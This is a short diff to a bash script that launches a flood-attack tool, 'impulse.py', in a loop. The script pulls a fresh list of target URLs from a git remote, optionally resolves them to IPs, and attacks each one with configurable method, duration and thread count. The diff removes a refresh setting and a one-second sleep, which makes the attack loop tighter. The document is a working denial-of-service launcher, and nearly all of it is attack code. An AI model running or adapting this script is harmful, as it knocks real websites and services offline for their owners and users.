@@ -11,7 +11,6 @@ done
 method="${method:-HTTP}"
 time="${time:-50}"
 threads="${threads:-20}"
-ip_refresh_period_sec=1800; # 30 minutes
 
 attack="python3 impulse.py --method ${method} --time ${time} --threads ${threads} --target %"
 
@@ -23,13 +22,10 @@ do
   echo "Get the latest scripts & URLs..."
   git pull --rebase origin master
   
-  echo "Done!"
   echo "Start attacking..."
   if [ "$method" == "HTTP" ]; then
     cat urls | xargs -n1 -I % bash -c "${attack}"
   else
     cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' | xargs -n1 -I % bash -c "${attack}"
   fi
-
-  sleep 1
 done
